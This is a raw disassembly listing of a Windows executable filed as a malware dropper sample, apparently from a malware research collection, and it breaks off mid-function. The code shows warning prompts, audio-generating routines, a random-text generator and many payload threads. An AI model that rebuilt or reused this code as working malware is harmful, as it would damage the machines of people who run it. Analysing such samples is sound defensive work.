
malware_samples/dropper/9f47d027f4eb8d1ca986a2e723397101d4368268285f79a95e59581794b8eca5.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 e4 f8             	and    $0xfffffff8,%esp
  401006:	81 ec 8c 00 00 00    	sub    $0x8c,%esp
  40100c:	a1 04 70 41 00       	mov    0x417004,%eax
  401011:	33 c4                	xor    %esp,%eax
  401013:	89 84 24 88 00 00 00 	mov    %eax,0x88(%esp)
  40101a:	56                   	push   %esi
  40101b:	8b 35 74 01 41 00    	mov    0x410174,%esi
  401021:	68 34 00 04 00       	push   $0x40034
  401026:	68 24 4c 41 00       	push   $0x414c24
  40102b:	68 40 4c 41 00       	push   $0x414c40
  401030:	6a 00                	push   $0x0
  401032:	ff d6                	call   *%esi
  401034:	83 f8 06             	cmp    $0x6,%eax
  401037:	0f 85 3e 03 00 00    	jne    0x40137b
  40103d:	68 34 00 04 00       	push   $0x40034
  401042:	68 2c 4d 41 00       	push   $0x414d2c
  401047:	68 68 4d 41 00       	push   $0x414d68
  40104c:	6a 00                	push   $0x0
  40104e:	ff d6                	call   *%esi
  401050:	83 f8 06             	cmp    $0x6,%eax
  401053:	0f 85 22 03 00 00    	jne    0x40137b
  401059:	6a 74                	push   $0x74
  40105b:	8d 44 24 18          	lea    0x18(%esp),%eax
  40105f:	6a 00                	push   $0x0
  401061:	50                   	push   %eax
  401062:	e8 e9 40 00 00       	call   0x405150
  401067:	c7 44 24 10 40 1f 00 	movl   $0x1f40,0x10(%esp)
  40106e:	00 
  40106f:	83 c4 0c             	add    $0xc,%esp
  401072:	c7 44 24 08 80 a9 03 	movl   $0x3a980,0x8(%esp)
  401079:	00 
  40107a:	f3 0f 7e 44 24 04    	movq   0x4(%esp),%xmm0
  401080:	66 0f d6 44 24 10    	movq   %xmm0,0x10(%esp)
  401086:	c7 44 24 04 40 1f 00 	movl   $0x1f40,0x4(%esp)
  40108d:	00 
  40108e:	c7 44 24 08 80 a9 03 	movl   $0x3a980,0x8(%esp)
  401095:	00 
  401096:	f3 0f 7e 44 24 04    	movq   0x4(%esp),%xmm0
  40109c:	66 0f d6 44 24 1c    	movq   %xmm0,0x1c(%esp)
  4010a2:	c7 44 24 04 40 1f 00 	movl   $0x1f40,0x4(%esp)
  4010a9:	00 
  4010aa:	c7 44 24 08 80 a9 03 	movl   $0x3a980,0x8(%esp)
  4010b1:	00 
  4010b2:	f3 0f 7e 44 24 04    	movq   0x4(%esp),%xmm0
  4010b8:	66 0f d6 44 24 28    	movq   %xmm0,0x28(%esp)
  4010be:	c7 44 24 04 40 1f 00 	movl   $0x1f40,0x4(%esp)
  4010c5:	00 
  4010c6:	c7 44 24 08 80 a9 03 	movl   $0x3a980,0x8(%esp)
  4010cd:	00 
  4010ce:	f3 0f 7e 44 24 04    	movq   0x4(%esp),%xmm0
  4010d4:	66 0f d6 44 24 34    	movq   %xmm0,0x34(%esp)
  4010da:	c7 44 24 04 40 1f 00 	movl   $0x1f40,0x4(%esp)
  4010e1:	00 
  4010e2:	c7 44 24 08 80 a9 03 	movl   $0x3a980,0x8(%esp)
  4010e9:	00 
  4010ea:	f3 0f 7e 44 24 04    	movq   0x4(%esp),%xmm0
  4010f0:	66 0f d6 44 24 40    	movq   %xmm0,0x40(%esp)
  4010f6:	c7 44 24 04 40 1f 00 	movl   $0x1f40,0x4(%esp)
  4010fd:	00 
  4010fe:	c7 44 24 08 80 a9 03 	movl   $0x3a980,0x8(%esp)
  401105:	00 
  401106:	f3 0f 7e 44 24 04    	movq   0x4(%esp),%xmm0
  40110c:	66 0f d6 44 24 4c    	movq   %xmm0,0x4c(%esp)
  401112:	c7 44 24 04 40 1f 00 	movl   $0x1f40,0x4(%esp)
  401119:	00 
  40111a:	c7 44 24 08 80 a9 03 	movl   $0x3a980,0x8(%esp)
  401121:	00 
  401122:	f3 0f 7e 44 24 04    	movq   0x4(%esp),%xmm0
  401128:	66 0f d6 44 24 58    	movq   %xmm0,0x58(%esp)
  40112e:	c7 44 24 04 40 1f 00 	movl   $0x1f40,0x4(%esp)
  401135:	00 
  401136:	c7 44 24 08 80 a9 03 	movl   $0x3a980,0x8(%esp)
  40113d:	00 
  40113e:	f3 0f 7e 44 24 04    	movq   0x4(%esp),%xmm0
  401144:	66 0f d6 44 24 64    	movq   %xmm0,0x64(%esp)
  40114a:	c7 44 24 04 40 1f 00 	movl   $0x1f40,0x4(%esp)
  401151:	00 
  401152:	c7 44 24 08 80 a9 03 	movl   $0x3a980,0x8(%esp)
  401159:	00 
  40115a:	f3 0f 7e 44 24 04    	movq   0x4(%esp),%xmm0
  401160:	66 0f d6 44 24 70    	movq   %xmm0,0x70(%esp)
  401166:	c7 44 24 04 40 1f 00 	movl   $0x1f40,0x4(%esp)
  40116d:	00 
  40116e:	c7 44 24 08 80 a9 03 	movl   $0x3a980,0x8(%esp)
  401175:	00 
  401176:	f3 0f 7e 44 24 04    	movq   0x4(%esp),%xmm0
  40117c:	0f 31                	rdtsc
  40117e:	68 f8 4b 41 00       	push   $0x414bf8
  401183:	c7 44 24 1c b0 15 40 	movl   $0x4015b0,0x1c(%esp)
  40118a:	00 
  40118b:	c7 44 24 28 00 16 40 	movl   $0x401600,0x28(%esp)
  401192:	00 
  401193:	c7 44 24 34 40 16 40 	movl   $0x401640,0x34(%esp)
  40119a:	00 
  40119b:	c7 44 24 40 80 16 40 	movl   $0x401680,0x40(%esp)
  4011a2:	00 
  4011a3:	c7 44 24 4c c0 16 40 	movl   $0x4016c0,0x4c(%esp)
  4011aa:	00 
  4011ab:	c7 44 24 58 00 17 40 	movl   $0x401700,0x58(%esp)
  4011b2:	00 
  4011b3:	c7 44 24 64 40 17 40 	movl   $0x401740,0x64(%esp)
  4011ba:	00 
  4011bb:	c7 44 24 70 80 17 40 	movl   $0x401780,0x70(%esp)
  4011c2:	00 
  4011c3:	c7 44 24 7c d0 17 40 	movl   $0x4017d0,0x7c(%esp)
  4011ca:	00 
  4011cb:	66 0f d6 84 24 80 00 	movq   %xmm0,0x80(%esp)
  4011d2:	00 00 
  4011d4:	c7 84 24 88 00 00 00 	movl   $0x401870,0x88(%esp)
  4011db:	70 18 40 00 
  4011df:	a3 f4 81 41 00       	mov    %eax,0x4181f4
  4011e4:	ff 15 a0 00 41 00    	call   *0x4100a0
  4011ea:	8b f0                	mov    %eax,%esi
  4011ec:	68 10 4c 41 00       	push   $0x414c10
  4011f1:	56                   	push   %esi
  4011f2:	ff 15 9c 00 41 00    	call   *0x41009c
  4011f8:	85 c0                	test   %eax,%eax
  4011fa:	74 02                	je     0x4011fe
  4011fc:	ff d0                	call   *%eax
  4011fe:	56                   	push   %esi
  4011ff:	ff 15 90 00 41 00    	call   *0x410090
  401205:	8b 35 98 00 41 00    	mov    0x410098,%esi
  40120b:	6a 00                	push   $0x0
  40120d:	6a 00                	push   $0x0
  40120f:	68 e8 03 00 00       	push   $0x3e8
  401214:	68 d0 41 40 00       	push   $0x4041d0
  401219:	6a 00                	push   $0x0
  40121b:	6a 00                	push   $0x0
  40121d:	ff d6                	call   *%esi
  40121f:	6a 00                	push   $0x0
  401221:	6a 00                	push   $0x0
  401223:	8d 44 24 18          	lea    0x18(%esp),%eax
  401227:	50                   	push   %eax
  401228:	68 40 14 40 00       	push   $0x401440
  40122d:	6a 00                	push   $0x0
  40122f:	6a 00                	push   $0x0
  401231:	ff d6                	call   *%esi
  401233:	b9 30 19 40 00       	mov    $0x401930,%ecx
  401238:	e8 83 06 00 00       	call   0x4018c0
  40123d:	b9 10 1a 40 00       	mov    $0x401a10,%ecx
  401242:	e8 79 06 00 00       	call   0x4018c0
  401247:	b9 40 1b 40 00       	mov    $0x401b40,%ecx
  40124c:	e8 6f 06 00 00       	call   0x4018c0
  401251:	b9 e0 1c 40 00       	mov    $0x401ce0,%ecx
  401256:	e8 65 06 00 00       	call   0x4018c0
  40125b:	b9 10 1e 40 00       	mov    $0x401e10,%ecx
  401260:	e8 5b 06 00 00       	call   0x4018c0
  401265:	b9 70 1f 40 00       	mov    $0x401f70,%ecx
  40126a:	e8 51 06 00 00       	call   0x4018c0
  40126f:	b9 40 21 40 00       	mov    $0x402140,%ecx
  401274:	e8 47 06 00 00       	call   0x4018c0
  401279:	b9 c0 25 40 00       	mov    $0x4025c0,%ecx
  40127e:	e8 3d 06 00 00       	call   0x4018c0
  401283:	b9 80 29 40 00       	mov    $0x402980,%ecx
  401288:	e8 33 06 00 00       	call   0x4018c0
  40128d:	b9 70 2b 40 00       	mov    $0x402b70,%ecx
  401292:	e8 29 06 00 00       	call   0x4018c0
  401297:	b9 d0 31 40 00       	mov    $0x4031d0,%ecx
  40129c:	e8 9f 1d 00 00       	call   0x403040
  4012a1:	b9 70 33 40 00       	mov    $0x403370,%ecx
  4012a6:	e8 95 1d 00 00       	call   0x403040
  4012ab:	b9 00 34 40 00       	mov    $0x403400,%ecx
  4012b0:	e8 8b 1d 00 00       	call   0x403040
  4012b5:	b9 d0 34 40 00       	mov    $0x4034d0,%ecx
  4012ba:	e8 81 1d 00 00       	call   0x403040
  4012bf:	b9 50 35 40 00       	mov    $0x403550,%ecx
  4012c4:	e8 77 1d 00 00       	call   0x403040
  4012c9:	b9 e0 35 40 00       	mov    $0x4035e0,%ecx
  4012ce:	e8 6d 1d 00 00       	call   0x403040
  4012d3:	b9 20 36 40 00       	mov    $0x403620,%ecx
  4012d8:	e8 63 1d 00 00       	call   0x403040
  4012dd:	b9 b0 36 40 00       	mov    $0x4036b0,%ecx
  4012e2:	e8 59 1d 00 00       	call   0x403040
  4012e7:	b9 20 37 40 00       	mov    $0x403720,%ecx
  4012ec:	e8 4f 1d 00 00       	call   0x403040
  4012f1:	b9 00 38 40 00       	mov    $0x403800,%ecx
  4012f6:	e8 45 1d 00 00       	call   0x403040
  4012fb:	b9 00 39 40 00       	mov    $0x403900,%ecx
  401300:	e8 3b 1d 00 00       	call   0x403040
  401305:	b9 40 39 40 00       	mov    $0x403940,%ecx
  40130a:	e8 31 1d 00 00       	call   0x403040
  40130f:	b9 c0 3a 40 00       	mov    $0x403ac0,%ecx
  401314:	e8 27 1d 00 00       	call   0x403040
  401319:	b9 b0 3b 40 00       	mov    $0x403bb0,%ecx
  40131e:	e8 1d 1d 00 00       	call   0x403040
  401323:	b9 90 3c 40 00       	mov    $0x403c90,%ecx
  401328:	e8 13 1d 00 00       	call   0x403040
  40132d:	b9 30 3e 40 00       	mov    $0x403e30,%ecx
  401332:	e8 09 1d 00 00       	call   0x403040
  401337:	6a 00                	push   $0x0
  401339:	6a 00                	push   $0x0
  40133b:	6a 00                	push   $0x0
  40133d:	68 50 40 40 00       	push   $0x404050
  401342:	6a 00                	push   $0x0
  401344:	6a 00                	push   $0x0
  401346:	ff d6                	call   *%esi
  401348:	6a 00                	push   $0x0
  40134a:	6a 00                	push   $0x0
  40134c:	6a 00                	push   $0x0
  40134e:	68 a0 41 40 00       	push   $0x4041a0
  401353:	6a 00                	push   $0x0
  401355:	6a 00                	push   $0x0
  401357:	ff d6                	call   *%esi
  401359:	68 20 4e 00 00       	push   $0x4e20
  40135e:	ff 15 a8 00 41 00    	call   *0x4100a8
  401364:	8b 8c 24 8c 00 00 00 	mov    0x8c(%esp),%ecx
  40136b:	33 c0                	xor    %eax,%eax
  40136d:	5e                   	pop    %esi
  40136e:	33 cc                	xor    %esp,%ecx
  401370:	e8 f5 2e 00 00       	call   0x40426a
  401375:	8b e5                	mov    %ebp,%esp
  401377:	5d                   	pop    %ebp
  401378:	c2 10 00             	ret    $0x10
  40137b:	6a 00                	push   $0x0
  40137d:	ff 15 94 00 41 00    	call   *0x410094
  401383:	cc                   	int3
  401384:	cc                   	int3
  401385:	cc                   	int3
  401386:	cc                   	int3
  401387:	cc                   	int3
  401388:	cc                   	int3
  401389:	cc                   	int3
  40138a:	cc                   	int3
  40138b:	cc                   	int3
  40138c:	cc                   	int3
  40138d:	cc                   	int3
  40138e:	cc                   	int3
  40138f:	cc                   	int3
  401390:	55                   	push   %ebp
  401391:	8b ec                	mov    %esp,%ebp
  401393:	83 ec 08             	sub    $0x8,%esp
  401396:	a1 04 70 41 00       	mov    0x417004,%eax
  40139b:	33 c5                	xor    %ebp,%eax
  40139d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4013a0:	53                   	push   %ebx
  4013a1:	8b d9                	mov    %ecx,%ebx
  4013a3:	ba 02 00 00 00       	mov    $0x2,%edx
  4013a8:	33 c9                	xor    %ecx,%ecx
  4013aa:	56                   	push   %esi
  4013ab:	57                   	push   %edi
  4013ac:	8d 43 01             	lea    0x1(%ebx),%eax
  4013af:	f7 e2                	mul    %edx
  4013b1:	0f 90 c1             	seto   %cl
  4013b4:	f7 d9                	neg    %ecx
  4013b6:	0b c8                	or     %eax,%ecx
  4013b8:	51                   	push   %ecx
  4013b9:	e8 bd 2e 00 00       	call   0x40427b
  4013be:	83 c4 04             	add    $0x4,%esp
  4013c1:	33 f6                	xor    %esi,%esi
  4013c3:	8b f8                	mov    %eax,%edi
  4013c5:	85 db                	test   %ebx,%ebx
  4013c7:	7e 4c                	jle    0x401415
  4013c9:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  4013d0:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  4013d5:	85 c0                	test   %eax,%eax
  4013d7:	75 1d                	jne    0x4013f6
  4013d9:	68 40 00 00 f0       	push   $0xf0000040
  4013de:	6a 01                	push   $0x1
  4013e0:	50                   	push   %eax
  4013e1:	50                   	push   %eax
  4013e2:	68 f8 81 41 00       	push   $0x4181f8
  4013e7:	ff 15 04 00 41 00    	call   *0x410004
  4013ed:	85 c0                	test   %eax,%eax
  4013ef:	74 3d                	je     0x40142e
  4013f1:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  4013f6:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  4013f9:	51                   	push   %ecx
  4013fa:	6a 04                	push   $0x4
  4013fc:	50                   	push   %eax
  4013fd:	ff 15 00 00 41 00    	call   *0x410000
  401403:	0f b6 45 f8          	movzbl -0x8(%ebp),%eax
  401407:	05 00 04 00 00       	add    $0x400,%eax
  40140c:	66 89 04 77          	mov    %ax,(%edi,%esi,2)
  401410:	46                   	inc    %esi
  401411:	3b f3                	cmp    %ebx,%esi
  401413:	7c bb                	jl     0x4013d0
  401415:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401418:	33 c0                	xor    %eax,%eax
  40141a:	66 89 04 5f          	mov    %ax,(%edi,%ebx,2)
  40141e:	33 cd                	xor    %ebp,%ecx
  401420:	8b c7                	mov    %edi,%eax
  401422:	5f                   	pop    %edi
  401423:	5e                   	pop    %esi
  401424:	5b                   	pop    %ebx
  401425:	e8 40 2e 00 00       	call   0x40426a
  40142a:	8b e5                	mov    %ebp,%esp
  40142c:	5d                   	pop    %ebp
  40142d:	c3                   	ret
  40142e:	6a 01                	push   $0x1
  401430:	ff 15 94 00 41 00    	call   *0x410094
  401436:	cc                   	int3
  401437:	cc                   	int3
  401438:	cc                   	int3
  401439:	cc                   	int3
  40143a:	cc                   	int3
  40143b:	cc                   	int3
  40143c:	cc                   	int3
  40143d:	cc                   	int3
  40143e:	cc                   	int3
  40143f:	cc                   	int3
  401440:	55                   	push   %ebp
  401441:	8b ec                	mov    %esp,%ebp
  401443:	83 e4 f8             	and    $0xfffffff8,%esp
  401446:	83 ec 5c             	sub    $0x5c,%esp
  401449:	a1 04 70 41 00       	mov    0x417004,%eax
  40144e:	33 c4                	xor    %esp,%eax
  401450:	89 44 24 58          	mov    %eax,0x58(%esp)
  401454:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401457:	53                   	push   %ebx
  401458:	56                   	push   %esi
  401459:	8b 35 a8 00 41 00    	mov    0x4100a8,%esi
  40145f:	57                   	push   %edi
  401460:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  401464:	0f 1f 40 00          	nopl   0x0(%eax)
  401468:	0f 1f 84 00 00 00 00 	nopl   0x0(%eax,%eax,1)
  40146f:	00 
  401470:	8d 41 04             	lea    0x4(%ecx),%eax
  401473:	c7 44 24 1c 0a 00 00 	movl   $0xa,0x1c(%esp)
  40147a:	00 
  40147b:	89 44 24 18          	mov    %eax,0x18(%esp)
  40147f:	90                   	nop
  401480:	8b 38                	mov    (%eax),%edi
  401482:	8b 58 04             	mov    0x4(%eax),%ebx
  401485:	8b 40 fc             	mov    -0x4(%eax),%eax
  401488:	89 7c 24 20          	mov    %edi,0x20(%esp)
  40148c:	89 44 24 10          	mov    %eax,0x10(%esp)
  401490:	ff 15 80 00 41 00    	call   *0x410080
  401496:	03 ff                	add    %edi,%edi
  401498:	89 44 24 24          	mov    %eax,0x24(%esp)
  40149c:	57                   	push   %edi
  40149d:	6a 00                	push   $0x0
  40149f:	50                   	push   %eax
  4014a0:	ff 15 84 00 41 00    	call   *0x410084
  4014a6:	8b d0                	mov    %eax,%edx
  4014a8:	c7 44 24 50 01 00 01 	movl   $0x10001,0x50(%esp)
  4014af:	00 
  4014b0:	8b 44 24 10          	mov    0x10(%esp),%eax
  4014b4:	89 44 24 54          	mov    %eax,0x54(%esp)
  4014b8:	89 54 24 14          	mov    %edx,0x14(%esp)
  4014bc:	c7 44 24 5c 02 00 10 	movl   $0x100002,0x5c(%esp)
  4014c3:	00 
  4014c4:	8d 0c 00             	lea    (%eax,%eax,1),%ecx
  4014c7:	89 54 24 30          	mov    %edx,0x30(%esp)
  4014cb:	33 c0                	xor    %eax,%eax
  4014cd:	89 4c 24 58          	mov    %ecx,0x58(%esp)
  4014d1:	50                   	push   %eax
  4014d2:	50                   	push   %eax
  4014d3:	50                   	push   %eax
  4014d4:	66 89 44 24 6c       	mov    %ax,0x6c(%esp)
  4014d9:	89 44 24 44          	mov    %eax,0x44(%esp)
  4014dd:	89 44 24 48          	mov    %eax,0x48(%esp)
  4014e1:	89 44 24 4c          	mov    %eax,0x4c(%esp)
  4014e5:	89 44 24 50          	mov    %eax,0x50(%esp)
  4014e9:	89 44 24 54          	mov    %eax,0x54(%esp)
  4014ed:	89 44 24 58          	mov    %eax,0x58(%esp)
  4014f1:	8d 44 24 5c          	lea    0x5c(%esp),%eax
  4014f5:	50                   	push   %eax
  4014f6:	6a ff                	push   $0xffffffff
  4014f8:	8d 44 24 40          	lea    0x40(%esp),%eax
  4014fc:	89 7c 24 48          	mov    %edi,0x48(%esp)
  401500:	50                   	push   %eax
  401501:	ff 15 a8 01 41 00    	call   *0x4101a8
  401507:	ff 74 24 14          	push   0x14(%esp)
  40150b:	8b 7c 24 24          	mov    0x24(%esp),%edi
  40150f:	57                   	push   %edi
  401510:	ff 74 24 18          	push   0x18(%esp)
  401514:	ff d3                	call   *%ebx
  401516:	83 c4 0c             	add    $0xc,%esp
  401519:	8d 44 24 30          	lea    0x30(%esp),%eax
  40151d:	6a 20                	push   $0x20
  40151f:	50                   	push   %eax
  401520:	ff 74 24 34          	push   0x34(%esp)
  401524:	ff 15 a4 01 41 00    	call   *0x4101a4
  40152a:	6a 20                	push   $0x20
  40152c:	8d 44 24 34          	lea    0x34(%esp),%eax
  401530:	50                   	push   %eax
  401531:	ff 74 24 34          	push   0x34(%esp)
  401535:	ff 15 b4 01 41 00    	call   *0x4101b4
  40153b:	69 c7 e8 03 00 00    	imul   $0x3e8,%edi,%eax
  401541:	99                   	cltd
  401542:	f7 7c 24 10          	idivl  0x10(%esp)
  401546:	50                   	push   %eax
  401547:	ff d6                	call   *%esi
  401549:	f6 44 24 40 01       	testb  $0x1,0x40(%esp)
  40154e:	75 0b                	jne    0x40155b
  401550:	6a 01                	push   $0x1
  401552:	ff d6                	call   *%esi
  401554:	f6 44 24 40 01       	testb  $0x1,0x40(%esp)
  401559:	74 f5                	je     0x401550
  40155b:	ff 74 24 2c          	push   0x2c(%esp)
  40155f:	ff 15 ac 01 41 00    	call   *0x4101ac
  401565:	6a 20                	push   $0x20
  401567:	8d 44 24 34          	lea    0x34(%esp),%eax
  40156b:	50                   	push   %eax
  40156c:	ff 74 24 34          	push   0x34(%esp)
  401570:	ff 15 b0 01 41 00    	call   *0x4101b0
  401576:	ff 74 24 14          	push   0x14(%esp)
  40157a:	6a 00                	push   $0x0
  40157c:	ff 74 24 2c          	push   0x2c(%esp)
  401580:	ff 15 8c 00 41 00    	call   *0x41008c
  401586:	8b 44 24 18          	mov    0x18(%esp),%eax
  40158a:	83 c0 0c             	add    $0xc,%eax
  40158d:	83 6c 24 1c 01       	subl   $0x1,0x1c(%esp)
  401592:	89 44 24 18          	mov    %eax,0x18(%esp)
  401596:	0f 85 e4 fe ff ff    	jne    0x401480
  40159c:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  4015a0:	e9 cb fe ff ff       	jmp    0x401470
  4015a5:	cc                   	int3
  4015a6:	cc                   	int3
  4015a7:	cc                   	int3
  4015a8:	cc                   	int3
  4015a9:	cc                   	int3
  4015aa:	cc                   	int3
  4015ab:	cc                   	int3
  4015ac:	cc                   	int3
  4015ad:	cc                   	int3
  4015ae:	cc                   	int3
  4015af:	cc                   	int3
  4015b0:	55                   	push   %ebp
  4015b1:	8b ec                	mov    %esp,%ebp
  4015b3:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4015b6:	33 c0                	xor    %eax,%eax
  4015b8:	56                   	push   %esi
  4015b9:	8d 34 09             	lea    (%ecx,%ecx,1),%esi
  4015bc:	85 f6                	test   %esi,%esi
  4015be:	7e 2e                	jle    0x4015ee
  4015c0:	53                   	push   %ebx
  4015c1:	57                   	push   %edi
  4015c2:	8b 7d 10             	mov    0x10(%ebp),%edi
  4015c5:	8b d8                	mov    %eax,%ebx
  4015c7:	8b d0                	mov    %eax,%edx
  4015c9:	c1 fa 08             	sar    $0x8,%edx
  4015cc:	c1 fb 0d             	sar    $0xd,%ebx
  4015cf:	22 d0                	and    %al,%dl
  4015d1:	89 55 0c             	mov    %edx,0xc(%ebp)
  4015d4:	8a cb                	mov    %bl,%cl
  4015d6:	22 c8                	and    %al,%cl
  4015d8:	2a d1                	sub    %cl,%dl
  4015da:	8a 4d 0c             	mov    0xc(%ebp),%cl
  4015dd:	2a cb                	sub    %bl,%cl
  4015df:	22 d1                	and    %cl,%dl
  4015e1:	32 55 0c             	xor    0xc(%ebp),%dl
  4015e4:	88 14 38             	mov    %dl,(%eax,%edi,1)
  4015e7:	40                   	inc    %eax
  4015e8:	3b c6                	cmp    %esi,%eax
  4015ea:	7c d9                	jl     0x4015c5
  4015ec:	5f                   	pop    %edi
  4015ed:	5b                   	pop    %ebx
  4015ee:	5e                   	pop    %esi
  4015ef:	5d                   	pop    %ebp
  4015f0:	c3                   	ret
  4015f1:	cc                   	int3
  4015f2:	cc                   	int3
  4015f3:	cc                   	int3
  4015f4:	cc                   	int3
  4015f5:	cc                   	int3
  4015f6:	cc                   	int3
  4015f7:	cc                   	int3
  4015f8:	cc                   	int3
  4015f9:	cc                   	int3
  4015fa:	cc                   	int3
  4015fb:	cc                   	int3
  4015fc:	cc                   	int3
  4015fd:	cc                   	int3
  4015fe:	cc                   	int3
  4015ff:	cc                   	int3
  401600:	55                   	push   %ebp
  401601:	8b ec                	mov    %esp,%ebp
  401603:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401606:	33 c0                	xor    %eax,%eax
  401608:	56                   	push   %esi
  401609:	8d 34 09             	lea    (%ecx,%ecx,1),%esi
  40160c:	85 f6                	test   %esi,%esi
  40160e:	7e 28                	jle    0x401638
  401610:	53                   	push   %ebx
  401611:	57                   	push   %edi
  401612:	8b 7d 10             	mov    0x10(%ebp),%edi
  401615:	8b d0                	mov    %eax,%edx
  401617:	8b c8                	mov    %eax,%ecx
  401619:	c1 f9 04             	sar    $0x4,%ecx
  40161c:	8a d8                	mov    %al,%bl
  40161e:	c1 fa 08             	sar    $0x8,%edx
  401621:	22 d1                	and    %cl,%dl
  401623:	8b c8                	mov    %eax,%ecx
  401625:	2a da                	sub    %dl,%bl
  401627:	c1 f9 0c             	sar    $0xc,%ecx
  40162a:	22 d9                	and    %cl,%bl
  40162c:	fe cb                	dec    %bl
  40162e:	88 1c 38             	mov    %bl,(%eax,%edi,1)
  401631:	40                   	inc    %eax
  401632:	3b c6                	cmp    %esi,%eax
  401634:	7c df                	jl     0x401615
  401636:	5f                   	pop    %edi
  401637:	5b                   	pop    %ebx
  401638:	5e                   	pop    %esi
  401639:	5d                   	pop    %ebp
  40163a:	c3                   	ret
  40163b:	cc                   	int3
  40163c:	cc                   	int3
  40163d:	cc                   	int3
  40163e:	cc                   	int3
  40163f:	cc                   	int3
  401640:	55                   	push   %ebp
  401641:	8b ec                	mov    %esp,%ebp
  401643:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401646:	33 c0                	xor    %eax,%eax
  401648:	57                   	push   %edi
  401649:	8d 3c 09             	lea    (%ecx,%ecx,1),%edi
  40164c:	85 ff                	test   %edi,%edi
  40164e:	7e 2d                	jle    0x40167d
  401650:	53                   	push   %ebx
  401651:	8b 5d 10             	mov    0x10(%ebp),%ebx
  401654:	56                   	push   %esi
  401655:	8b f0                	mov    %eax,%esi
  401657:	8b c8                	mov    %eax,%ecx
  401659:	8b d0                	mov    %eax,%edx
  40165b:	c1 fe 08             	sar    $0x8,%esi
  40165e:	c1 fa 04             	sar    $0x4,%edx
  401661:	c1 f9 10             	sar    $0x10,%ecx
  401664:	23 d6                	and    %esi,%edx
  401666:	23 ce                	and    %esi,%ecx
  401668:	d3 fa                	sar    %cl,%edx
  40166a:	0f b6 c8             	movzbl %al,%ecx
  40166d:	0f b6 d2             	movzbl %dl,%edx
  401670:	0f af d1             	imul   %ecx,%edx
  401673:	88 14 18             	mov    %dl,(%eax,%ebx,1)
  401676:	40                   	inc    %eax
  401677:	3b c7                	cmp    %edi,%eax
  401679:	7c da                	jl     0x401655
  40167b:	5e                   	pop    %esi
  40167c:	5b                   	pop    %ebx
  40167d:	5f                   	pop    %edi
  40167e:	5d                   	pop    %ebp
  40167f:	c3                   	ret
  401680:	55                   	push   %ebp
  401681:	8b ec                	mov    %esp,%ebp
  401683:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401686:	33 c0                	xor    %eax,%eax
  401688:	56                   	push   %esi
  401689:	8d 34 09             	lea    (%ecx,%ecx,1),%esi
  40168c:	85 f6                	test   %esi,%esi
  40168e:	7e 2d                	jle    0x4016bd
  401690:	57                   	push   %edi
  401691:	8b 7d 10             	mov    0x10(%ebp),%edi
  401694:	8b d0                	mov    %eax,%edx
  401696:	8b c8                	mov    %eax,%ecx
  401698:	c1 fa 10             	sar    $0x10,%edx
  40169b:	c1 f9 08             	sar    $0x8,%ecx
  40169e:	0a d1                	or     %cl,%dl
  4016a0:	8b c8                	mov    %eax,%ecx
  4016a2:	c1 f9 07             	sar    $0x7,%ecx
  4016a5:	0a d1                	or     %cl,%dl
  4016a7:	0f b6 c8             	movzbl %al,%ecx
  4016aa:	f6 d2                	not    %dl
  4016ac:	22 d0                	and    %al,%dl
  4016ae:	0f b6 d2             	movzbl %dl,%edx
  4016b1:	0f af d1             	imul   %ecx,%edx
  4016b4:	88 14 38             	mov    %dl,(%eax,%edi,1)
  4016b7:	40                   	inc    %eax
  4016b8:	3b c6                	cmp    %esi,%eax
  4016ba:	7c d8                	jl     0x401694
  4016bc:	5f                   	pop    %edi
  4016bd:	5e                   	pop    %esi
  4016be:	5d                   	pop    %ebp
  4016bf:	c3                   	ret
  4016c0:	55                   	push   %ebp
  4016c1:	8b ec                	mov    %esp,%ebp
  4016c3:	8b 45 0c             	mov    0xc(%ebp),%eax
  4016c6:	33 c9                	xor    %ecx,%ecx
  4016c8:	57                   	push   %edi
  4016c9:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  4016cc:	85 ff                	test   %edi,%edi
  4016ce:	7e 26                	jle    0x4016f6
  4016d0:	53                   	push   %ebx
  4016d1:	8b 5d 10             	mov    0x10(%ebp),%ebx
  4016d4:	56                   	push   %esi
  4016d5:	8b f1                	mov    %ecx,%esi
  4016d7:	8b c1                	mov    %ecx,%eax
  4016d9:	c1 f8 08             	sar    $0x8,%eax
  4016dc:	c1 fe 09             	sar    $0x9,%esi
  4016df:	23 f0                	and    %eax,%esi
  4016e1:	8b c1                	mov    %ecx,%eax
  4016e3:	0f af c1             	imul   %ecx,%eax
  4016e6:	46                   	inc    %esi
  4016e7:	99                   	cltd
  4016e8:	f7 fe                	idiv   %esi
  4016ea:	24 80                	and    $0x80,%al
  4016ec:	88 04 19             	mov    %al,(%ecx,%ebx,1)
  4016ef:	41                   	inc    %ecx
  4016f0:	3b cf                	cmp    %edi,%ecx
  4016f2:	7c e1                	jl     0x4016d5
  4016f4:	5e                   	pop    %esi
  4016f5:	5b                   	pop    %ebx
  4016f6:	5f                   	pop    %edi
  4016f7:	5d                   	pop    %ebp
  4016f8:	c3                   	ret
  4016f9:	cc                   	int3
  4016fa:	cc                   	int3
  4016fb:	cc                   	int3
  4016fc:	cc                   	int3
  4016fd:	cc                   	int3
  4016fe:	cc                   	int3
  4016ff:	cc                   	int3
  401700:	55                   	push   %ebp
  401701:	8b ec                	mov    %esp,%ebp
  401703:	8b 45 0c             	mov    0xc(%ebp),%eax
  401706:	56                   	push   %esi
  401707:	8d 34 00             	lea    (%eax,%eax,1),%esi
  40170a:	33 c0                	xor    %eax,%eax
  40170c:	85 f6                	test   %esi,%esi
  40170e:	7e 24                	jle    0x401734
  401710:	53                   	push   %ebx
  401711:	57                   	push   %edi
  401712:	8b 7d 10             	mov    0x10(%ebp),%edi
  401715:	8b d8                	mov    %eax,%ebx
  401717:	8b d0                	mov    %eax,%edx
